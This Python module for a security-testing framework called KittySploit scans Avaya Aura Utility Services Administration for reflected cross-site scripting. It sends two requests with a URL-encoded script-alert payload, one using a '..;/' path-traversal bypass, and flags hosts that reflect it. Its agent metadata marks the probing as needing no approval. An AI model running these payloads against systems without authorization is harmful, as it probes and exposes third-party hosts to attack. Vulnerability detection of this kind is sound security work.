#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Avaya Aura Utility Services Administration contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Avaya Aura Utility Services Administration - Cross-Site Scripting Detection',
        'description': 'Avaya Aura Utility Services Administration contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'avaya', 'aura', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/',
            'https://download.avaya.com/css/public/documents/101076366',
        ],
    }

    def run(self):
        for path in ('/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e', '/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<script>alert(document.domain)</script>', 'Avaya Aura Device Services',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Avaya Aura Utility Services Administration - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

